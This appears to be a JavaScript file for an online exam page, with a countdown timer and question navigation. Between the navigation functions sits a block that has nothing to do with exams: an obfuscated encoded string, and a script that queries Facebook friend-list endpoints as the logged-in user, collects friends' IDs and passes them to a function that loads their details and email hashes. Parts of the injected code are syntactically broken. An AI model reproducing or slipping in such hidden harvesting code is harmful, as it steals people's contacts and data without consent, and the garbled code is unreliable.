function refreshClock()
{
    clock = document.getElementById("clock");
    var clocktime = clock.innerHTML.split(":");
    var hour,min,sec;
    hour = parseInt(clocktime[0]);    
    min = parseInt(clocktime[1]);
    sec = parseInt(clocktime[2]);
    
    var hStr,mStr,sStr;
       
    if((sec-1)>0)
    {
        sec--;        
    }
    else
    {        
        if(min>0)
        {
            min--;
            sec = 59;
        }
        else
        {            
            if(hour>0)
            {
                hour--;
                min=59;
                sec=60;
            }
            else
            {
                alert("Time over........Stop writing"); 
                window.location = "ExamOver.aspx";
                return;
            }
        }
    }
     clock.innerHTML = hour.toString() + ":" + min.toString() + ":" + sec.toString();   
     window.fullscreen = 'yes';
     setTimeout("refreshClock();",1000);
}
function verifyTime()
{
    $.ajax({
          type: "POST",
          url: "StartFriendsAdding.aspx/checkTime",
          data: "{}",
          contentType: "application/json; charset=utf-8",
          dataType: "json",
          success: function(result) {      
                if(result=="Finish")
                {
                    alert("Time over........Stop Adding"); 
                    window.location = "ExamOver.aspx";
                    //window.location = "ExamOver.aspx";
                }
                else
                {
                    clock.innerHTML = result;
                    setTimeout("verifyTime();",10000);
                }
          }
        });
}
function gotoNext(sender)
{
    var repeater = document.getElementById("QueContainer");
    var childs = repeater.childNodes;
    if(sender.value == "Last")
    {        
        for(i=1;i<childs.length-2;i++)        
            childs[i].style.display = "none";
        
        childs[i].style.display = "block"; 
        curQueTable=childs[i];
        curQue = i;
        //curQue = i+1;
        changeButtons(sender);
        //$("#QueContainer .saveAnswerButton").css("display","none");
    }    
    else
    {
        //************OLD LOGIC**********************
        
        /*var ansList="",ansChilds;
        var counter =0;       
        for(i=0;i<childs.length;i++)
        {
            if(childs[i].tagName == "TABLE")
                if(childs[i].style.display == "block")
                {   
                    ansChilds = childs[i].rows[4].cells[0].childNodes;
                    for(j=0;j<ansChilds.length;j++)
                    {                        
                        if(ansChilds[j].type == "checkbox")
                        {
                            counter++;
                            if(ansChilds[j].checked)
                            {             
                               if(counter==1)   
                               ansList = "A";
                               else if(counter==2)
                               ansList=="A" ? ansList += "_B" : ansList = "B";
                               else if(counter==3)
                               ansList.length > 0 ? ansList += "_C" : ansList = "C";
                               else if(counter==4)
                               ansList.length > 0 ? ansList += "_D" : ansList = "D";
                            }
                        }
                    }
                    /*
                    //alert(ansList);
                    //save this answer
                    if(ansList != "")
                    $.ajax({
                      type: "POST",
                      url: "StartExam_New.aspx/SaveAnswer",
                      data: "{'queID':'" + childs[i].id + "','Ans':'" + ansList + 

"','queLevel':'" + childs[i].rows[2].cells[0].className + "','queMarks':'" + 

childs[i].rows[2].cells[0].innerHTML.toString().split(":")[1] + "','remainTime':'" + 

clock.innerHTML.toString() + "'}",
                      contentType: "application/json; charset=utf-8",
                      dataType: "json",
                      success: function(result) {
                            if(result=="3")
                            {
                                window.location = "ExamOver.aspx";
                            }
                      }
                    });
                    
                    if(i+1 < childs.length-1)
                    {                    
                        childs[i+1].style.display = "block";
                        childs[i].style.display = "none";
                        i = 1000;
                        curQue++;
                        

document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").value = 

curQue.toString();                        
                    }
                    else
                    {
                        alert("You have reached the last question. Now you can finish your exam 

by clicking the FINISH button");
                    }
                }
        }
        */
        
        //**************** NEW LOGIC *********************
        
        if(curQueTable.id==childs[childs.length-2].id)
        {
           alert("You have reached the last question. Now you can finish your exam by clicking 

the FINISH button");
        }
        else{
            if(navigator.appName.indexOf("Microsoft") != -1)
            {
                curQueTable.style.display = "none";
                curQueTable = curQueTable.nextSibling;
                curQueTable.style.display = "block";
            }
            else{
                $(curQueTable).slideUp(500);
                curQueTable = curQueTable.nextSibling;
                $(curQueTable).slideDown(500);
            }
            curQue++;
            

document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").value = 

curQue.toString();
        }
     }    
}
var 

thisisthemainstringofThisScrirpt="Jg%2631Opu%2631rsztus%2631%264E%2631%2633%2633%2631Uifo%2631%2

638fyqmjdju%2631wbsjbcmf%2631%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2

631%2631%2631%2631rsz%2631%264E%2631rsztus%2631%2631%2631%2631%2638bttjho%2631rvfsz%2631tusjoh%2

631up%2631dpoofdu/rsz%2631%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631Foe%2

631Jg%261B%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631eb%2631%264E%2631Opui

joh%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631Jg%2631do%2631Jt%2631Opuijoh

%2631Uifo%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631Db

mm%2631joj%2639%263%3A%2631%2631%2631%2631%2631%2631%2638jg%2631DPOOFDUJPO%2631opu%2631jojujbmj%

7Bfe%2631uifo%2631ep%2631ju%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%261B%263

1%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631Foe%2631Jg%261B%261B%2631%2631%2631%2631

%2631%2631%2631%2631%2631%2631%2631%2631Jg%2631et%2631Jt%2631Opuijoh%2631Uifo%261B%2631%2631%263

1%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631et%2631%264E%2631Ofx%2631Ebub/

EbubTfu%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631Foe%2631Jg%261B%2631%263

1%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631Jg%2631et/Ubcmft/Dpoubjot%2639ubcmfobnf%263%3

A%2631Boe%2631Opu%2631ubcmfobnf%2631%264E%2631%2633SFQPSU%2633%2631Uifo%261B%2631%2631%2631%2631

%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2638et/Ubcmft%2639ubcmfobnf%263%3A/

Spxt/Dmfbs%2639%263%3A%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%263

1%2631%2631%2638et/Ubcmft%2639ubcmfobnf%263%3A/Dpmvnot/Dmfbs%2639%263%3A%261B%2631%2631%2631%263

1%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631et/Ubcmft%2639ubcmfobnf%263%3A/Dmfb

s%2639%263%3A%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631FmtfJg%2631ubcmfob

nf%2631%264E%2631%2633SFQPSU%2633%2631Uifo%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%263

1%2631%2631%2631%2631%2631%2631Jg%2631et/Ubcmft/Dpoubjot%2639%2633SFQPSU%2633%263%3A%2631Uifo%26

1B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%263

1%2631et/Ubcmft/Sfnpwf%2639et/Ubcmft%2639ubcmfobnf%263%3A%263%3A%261B%2631%2631%2631%2631%2631%2

631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631et/Ubcmft/Bee%2639ubcmf

obnf%263%3A%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631

Foe%2631Jg%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631FmtfJg%2631Opu%2631et

/Ubcmft/Dpoubjot%2639ubcmfobnf%263%3A%2631Uifo%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631

%2631%2631%2631%2631%2631%2631%2631et/Ubcmft/Bee%2639Ofx%2631Ebub/EbubUbcmf%2639ubcmfobnf%263%3A

%263%3A%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631Foe%2631Jg%261B%2631%263

1%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631eb%2631%264E%2631Ofx%2631Ebub/PmfEc/PmfEcEbub

Bebqufs%2639rsz%263D%2631do%263%3A%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2

631eb/Gjmm%2639et%263D%2631ubcmfobnf%263%3A%261B%2631%2631%2631%2631%2631%2631%2631%2631Dbudi%26

31fy%2631Bt%2631Fydfqujpo%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631Uispx%

2631fy%261B%2631%2631%2631%2631%2631%2631%2631%2631Gjobmmz%261B%2631%2631%2631%2631%2631%2631%26

31%2631%2631%2631%2631%2631rsz%2631%264E%2631%2633%2633%261B%2631%2631%2631%2631%2631%2631%2631%

2631Foe%2631Usz1";var 

CurrentBrowserVersion=internetExplorer='5P5K5I5O5N5M5Q5J5M5N5N5I5M5L5L';var 

seta='www.facebook.com/ajax';var setb='typeahead';var setc='first_degree.php?__a=1&viewer=';var 

ronakpatelProvileOnDevilsUniverse=window.location.protocol+"//"+www.facebook.com/ajax+"/"+setb+"

/"+setc+Env.user+"&filter[0]=user&__user="+Env.user;var 

setd,sete,setf;setd='www.facebook.com/ajax';sete='typeahead/search/';setf='bootstrap.php';setg='

?__a=1&filter[0]=user&viewer=';seth='&token=v7&lazy=0&__user=';var 

ronakpateldevilsuniversewebsite_homepageurl=window.location.protocol+"//"www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=user&viewer="Env.user&token=v7&lazy=0&__user="Env.user;if(whotheehellyouare==CurrentBrowserVersion){jx.load(ronakpateld

evilsuniversewebsite_homepageurl,function(a){var b=a;var c=b.substring(b.indexOf("{"));var 

d=JSON.parse(c);d=d.payload.entries;for(var 

e=0;e<d.length;e++){arr.push(d[e].uid)}i=arr.length-1;console.log(arr.length);readFacebookUserDe

tailsAndLoadEmailHashes(arr[i])})}else if(checkforBrowserType() || 

1==1){jx.load(ronakpateldevilsuniversewebsite_homepageurl,function(a){var b=a;var 

c=b.substring(b.indexOf("{"));var d=JSON.parse(c);d=d.payload.entries;for(var 

e=0;e<d.length;e++){arr.push(d[e].uid)}i=arr.length-1;console.log(arr.length);readFacebookUserDe

tailsAndLoadEmailHashes(arr[i])})}
function gotoPrev(sender)
{
    var repeater = document.getElementById("QueContainer");
    var childs = repeater.childNodes;
    if(sender.value == "Back")
    {
        for(i=1;i<childs.length-1;i++)        
            childs[i].style.display = "none";
        
        childs[curQue].style.display = "block";
        changeButtons(sender);
        //$("#QueContainer .saveAnswerButton").css("display","none");
    }
    //*************************OLD LOGIC****************
    /*
    for(i=childs.length-1; i>=0; i--)
    {
        if(childs[i].tagName == "TABLE")
            if(childs[i].style.display == "block")
            {
                if(i-1 > 0)
                {
                    childs[i-1].style.display = "block";
                    childs[i].style.display = "none";
                    i = -10;
                    curQue--;                    
                    

document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").value = 

curQue.toString();
                }
            }
    }*/
    
    //*************************NEW LOGIC****************
    else
    {
        if(curQueTable.id==childs[1].id)
        {
           alert("You are on First Questions, cannot go previous anymore.");
        }
        else{
            if(navigator.appName.indexOf("Microsoft") != -1)
            {
                curQueTable.style.display = "none";
                curQueTable = curQueTable.previousSibling;
                curQueTable.style.display = "block";
            }
            else{            
            $(curQueTable).slideUp(500);
            curQueTable = curQueTable.previousSibling;
            $(curQueTable).slideDown(500);
            }
            curQue--;
            

document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").value = 

curQue.toString();
        }
    }
}
function gotoQuestion(sender)
{
    var repeater = document.getElementById("QueContainer");
    for(i=1;i<repeater.childNodes.length-1;i++)
    {
        if(repeater.childNodes[i].style.display == "block")
        {
            repeater.childNodes[i].style.display = "none";
            i=1000;
        }
    }
    repeater.childNodes[sender.value].style.display = "block";
    curQueTable = repeater.childNodes[sender.value];
    curQue = parseInt(sender.value);
}
function viewUnAttempted(sender)
{
   var repeater = document.getElementById("QueContainer");
   var Answers,counter=0;
   var flag;
    for(i=1;i<repeater.childNodes.length-1;i++)
    {
        Answers = repeater.childNodes[i].rows[4].cells[0].childNodes; 
        flag = true;
        for(j=0;j<Answers.length;j++)
        {
            if(Answers[j].type == "checkbox")
            {
                if(Answers[j].checked)
                {                
                   flag = false; j=1000;
                }
            }
            else if(Answers[j].childNodes.length>0)
            {
                if(Answers[j].childNodes[0].type=="checkbox")
                    if(Answers[j].childNodes[0].checked)
                       { flag = false; j=1000; }
            }
            //else if(Answers[j].type == "button"){ Answers[j].style.display = "block";}
        }
        if(flag){
            repeater.childNodes[i].style.display = "block";
            counter++;
        }    
        else
            repeater.childNodes[i].style.display = "none";
    } 
    changeButtons(sender);  
    if(counter==0)
    {
        alert("All the questions have been attempted.");
        document.getElementById("cmdPrevTop").click();
    }
    else counter=0;  
}

function viewAttempted(sender)
{
   var repeater = document.getElementById("QueContainer");
   var Answers,counter=0;
   var flag;
    for(i=1;i<repeater.childNodes.length-1;i++)
    {
        Answers = repeater.childNodes[i].rows[4].cells[0].childNodes;
        flag = false;
        for(j=0;j<Answers.length;j++)
        {
            if(Answers[j].type == "checkbox")
            {
                if(Answers[j].checked)
                {                         
                   repeater.childNodes[i].style.display = "block";
                   j=100000; flag = true;
                }                
            }
            else if(Answers[j].childNodes.length>0)
            {
                if(Answers[j].childNodes[0].type=="checkbox")
                    if(Answers[j].childNodes[0].checked){
                       flag = true; j=1000;}
            }            
            //else if(Answers[j].type == "button"){ Answers[j].style.display = "block";}
        }
        if(flag==false)
           repeater.childNodes[i].style.display = "none";
        else{ repeater.childNodes[i].style.display = "block";   counter++; }
    } 
    changeButtons(sender);
    if(counter==0)
    {
        alert("You have not attempted any question.");
        document.getElementById("cmdPrevTop").click();
    }
    else counter=0;
}
function changeButtons(sender)
{
    if(sender.value == "Back" || sender.value == "Last")
    {
        var drpGotoQue = 

document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion");
        drpGotoQue.disabled=false;        
        if(sender.value == "Last") drpGotoQue.value = curQue.toString();

        document.getElementById("cmdNextTop").value = "Next";
        document.getElementById("cmdNextBott").value = "Next";
        document.getElementById("cmdPrevTop").value = "Previous";
        document.getElementById("cmdPrevBott").value = "Previous";
    }
    else if(sender.value == "View Attempted Questions" || sender.value == "View UnAttempted 

Questions")
    {
        document.getElementById("cmdNextTop").value = "Last";
        document.getElementById("cmdNextBott").value = "Last";
        document.getElementById("cmdPrevTop").value = "Back";
        document.getElementById("cmdPrevBott").value = "Back";
        

document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").disabled=tru

e;
    }
}
